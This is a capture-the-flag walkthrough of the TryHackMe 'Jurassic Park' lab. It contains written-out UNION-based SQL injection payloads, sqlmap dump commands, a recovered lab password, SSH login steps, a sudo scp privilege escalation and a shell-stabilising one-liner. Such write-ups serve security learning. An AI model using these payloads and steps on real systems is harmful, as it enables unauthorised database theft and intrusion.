---
date: 2025-01-09
categories: [CTF, THM]
title: "THM - Jurassic Park"
tags: ['nmap', 'privilege escalation', 'python', 'rce', 'sqli']

description: "Jurassic Park - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - Jurassic Park

NMAP

![image1](../resources/0d8486104815498dbb69eb0d08f9f0ce.png)

Website  `http://10.10.204.254/shop.php`

![image2](../resources/45ff848e4e2144b08d81a73bf66b9f3a.png)

- Clicking on one gives the following URL:

`http://10.10.204.254/item.php?id=3`

- If you remove the ?id=3 it results in:

![image3](../resources/f143690100104fe89cef2b27c46b7d6a.png)

- So we know it's MySQL

- Attempting to break it:

`http://10.10.204.254/item.php?id=3'`

or using Union

`http://10.10.204.254/item.php?id=3 UNION SELECT 1 --`


![image4](../resources/73d44746390b456287aab5787447fd81.png)


![image5](../resources/1ad2d0b6688546db8b2fe5c0735fd687.png)

- I randomly changed the id=100  `http://10.10.204.254/item.php?id=100`


![image6](../resources/912e630cebc14b458a3866468a8818e7.png)

Compared to (normal request ie. id=1):


![image7](../resources/31a7e397bc2d46e4a6cfd4c76ac26ece.png)

- Fuzzing the id field ?id=5

`http://10.10.204.254/item.php?id=5`


![image8](../resources/26983266b6fa45548a59b591a4548c36.png)

`http://10.10.204.254/item.php?id=5 union select 1`


![image9](../resources/b8c49afcc66540ed87671ed2043f9e6a.png)

```bash
union select 1,2,3,4,5

```

![image10](../resources/d7a3af7b686c4cb7878bd5940a5c5ca5.png)

- 2 and 4 are being reflected so:
```bash
union select 1,database(),3,version(),5

```

![image11](../resources/a2527e647a984555a29acdf0855d8e6c.png)


![image12](../resources/09bc127294704ff9b5b1dc4fad73f19e.png)

- Fetch the users table from the database

```bash
?id=1 union select 1,2,3,group_concat(column_name),5 from information_schema.columns where table_schema = database() and table_name = "users"

```

![image13](../resources/4f29f6b27b164a3d88c4625aff32b250.png)

- Get column passwords from the table

```bash
?id=1 union select 1,2,3,password,5 from users

```

![image14](../resources/bcb29cdb94da432a9f681737285eba68.png)

- But it dared me to use SQLMap so...

- Open Burp and capture the request. Save the request to a file (burp)


![image15](../resources/e203c5678a324f6f9d0ff7cfaf21b647.png)

- Run SQLMap:
```bash
sqlmap -r burp --batch

```
- Found the following injection points:

![image16](../resources/b522cbfca79e43ff8d559b8bf7b8c3be.png)

- Or just dump the database (more noisy):
```bash
sqlmap -r burp --batch --dump

```

![image17](../resources/623dc3a0492240c188eba816bb16c36a.png)


![image18](../resources/e3e7e9b6bd3444ba8b48bfb6ef2a53ae.png)

**Dennis : ih8dinos**

- SSH with the credentials:
```bash
ssh dennis@10.10.204.254

```
- Enumeration:

```bash
sudo -l

```

![image19](../resources/3de621fb681d4d3bbde25c06b18bd1ed.png)

- We can run scp as sudo

- GTFOBins


![image20](../resources/8f9b2b08eeb1490eb1286d51671eddf9.png)


![image21](../resources/b635569cb6d54129be10089ed47bba69.png)

- Got Root

![image22](../resources/1b6e1e41bc804d6d9db55a4f46f4e11e.png)

- Stabilise:
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image23](../resources/0196f74cfb104313b16a28f7840ebe7f.png)

- Search for flags
```bash
find / -name "flag\*" 2>/dev/null

```

![image24](../resources/b138f792a58e488283c75ffb24c7258c.png)


![image25](../resources/da975e6f85094c7493e8d327b1d95aa9.png)

- Found flag3 in:
/home/dennis/.bash_history